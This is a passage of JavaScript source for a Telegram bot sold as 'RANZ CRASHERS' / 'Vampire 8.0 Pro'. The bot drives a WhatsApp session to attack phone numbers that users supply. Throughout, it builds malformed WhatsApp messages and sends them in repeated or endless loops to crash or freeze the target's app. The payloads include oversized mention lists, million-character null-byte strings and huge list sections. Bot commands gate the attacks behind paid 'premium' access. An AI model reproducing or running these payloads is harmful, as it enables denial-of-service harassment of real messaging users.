                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = "image/webp";
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function yudiono(target) {
  return sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 1,
              forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
              },
              remoteJid: "status@broadcast",
              participant: target,
              quotedMessage: {
                interactiveResponseMessage: {
                  body: {
                    format: 1,
                    text: `RANZ COLD`,
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
                      1000000,
                    )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
                      1000000,
                    )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                    version: 3,
                  },
                },
              },
            },
            body: {
              text: "*⺞ 𝙒𝙃𝙀𝙍𝙀 𝙄𝙎 𝙎𝙄𝘽𝘼𝙔?*",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonsParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );
}
async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Vampire Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Vampire Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function VampireIOS(target) {
for (let i = 0; i < 10; i++) {
await VampireCrashiPhone(target);
await VampireiPhone(target);
await VampireInvisIphone(target);
await VampireBlankIphone(target);
}
};
async function VampOri(target) {
    for (let i = 0; i <= 5; i++) {
    await ZerosBlankX(target, Ptcp = true)
    await spamNotif(target, Ptcp = true)
    await zerosUi(target, Ptcp = true)
    await spamNotif(target, Ptcp = true)
    await zerosUi(target, Ptcp = true)
    await spamNotif(target, Ptcp = true)
    await zerosUi(target, Ptcp = true)
    await spamNotif(target, Ptcp = true)
    await zerosUi(target, Ptcp = true)
    await ZerosBlankX(target, Ptcp = true)
    }

}
async function VampDelayInvis(target) {
    for (let i = 0; i <= 200; i++) {
    await VampBroadcast(target, mention = true)
    await new Promise((resolve) => setTimeout(resolve, 3500));
    await VampDelayMess(target, Ptcp = true)
    await new Promise((resolve) => setTimeout(resolve, 2500));
    }

}
async function VampBeta(target) {
    while (true) {
    await VampSuperDelay(target)
    await new Promise((resolve) => setTimeout(resolve, 2500));
    console.log(chalk.red("Send Bug Succes"))
    }

}
async function VampCrashChat(target) {
    for (let i = 0; i <= 100; i++) {
    VampDelayMess
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    }

}
async function VampCrashUi(target) {
    for (let i = 0; i <= 100; i++) {
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    }

}
async function VampiPhone(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireIOS(target);
    }

}
async function VampChannel(target) {
    for (let i = 0; i <= 5; i++) {
    await VampCrashCH(target)
    await VampCrashCH2(target)
    }

}
async function VampGroup(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireBugIns(groupJid)
    }

}
async function callbug(target) {
  for (let i = 0; i <= 5; i++) {
    await spamcall(target);
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  
  if (shouldIgnoreMessage(msg)) return;

  // Ambil tanggal sekarang
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;

  let ligma = `
╭━━━『 R A N Z ✦ C R A S H E R S 』━━━━
│
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
│
╰━━━━━━━━━━━
『 𝘾𝙇𝙄𝘾𝙆 𝘽𝙐𝙏𝙏𝙊𝙉 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄 』

- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ
`;

  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                      callback_data: "bugmenu"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmgvbbenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
  \`\`\`
╭━━━『 R A N Z ✦ C R A S H E R S 』━━━━
│
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
│
│   ⚘ BUG MENU ⚘
│ 
│ ❀ /ranzunli <number>
│ ❀ /ranznew <number> 
│ ❀ /ranznull <number>
│ ❀ /ranzios <number>
│ ❀ /ranzcombo <number>
│ ❀ 
│ 
╰═════════════════❀

- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ\`\`\``;
  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/abee1945"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermjdjdjenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」──────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/Vampiresagara"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/toolsjdjfjcmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」───────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/Vampiresagara"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara Bego\nContoh Nih Njing: /addbot 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh Nih Njing : /addbot 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});

bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Vampire!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Pastikan hanya owner yang bisa mengatur cooldown
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Lu Siapa Ngentot...\nGak ada hak gunain fitur ini");
  }

  // Pastikan match[1] ada dan valid
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam format angka diikuti 'm'. Contoh: /cooldown 10m");
  }

  const newCooldown = parseInt(match[1], 10);
  if (isNaN(newCooldown) || newCooldown <= 0) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam menit.");
  }

  cooldownTime = newCooldown * 60; // Ubah ke detik
  return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
});
bot.onText(/\/delaykont(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (shouldIgnoreMessage(msg)) return;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /delaymention 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /delaymention 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
        await delaykon(formatedNumber);
    }

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /delaymention
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (shouldIgnoreMessage(msg)) return;
    
    if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /superdelay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /freze 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    while (true) {
        await boegProtocol(formatedNumber);
        await new Promise((resolve) => setTimeout(resolve, 2000));
        await SLoct(formatedNumber);
        await new Promise((resolve) => setTimeout(resolve, 3000));
    }

    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzunli
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/ranzios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (shouldIgnoreMessage(msg)) return;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /system 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /system 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
        await iosinVisFC(formatedNumber, false)
        await new Promise((resolve) => setTimeout(resolve, 2000));
        console.log(chalk.red("Send Bug Succes"))
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzbullx 
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/ranznull(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (shouldIgnoreMessage(msg)) return;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Belom premium bang!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor \nContoh Nih : /bakios 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /bakios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 100; i++) { // Kirim 3 kali langsung
        await delay5GB(formatedNumber);
        await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /bakios
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/ranznew(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (shouldIgnoreMessage(msg)) return;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /delay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampblank 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
        await oneMsgFC(formatedNumber);
        await new Promise((resolve) => setTimeout(resolve, 4000));
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
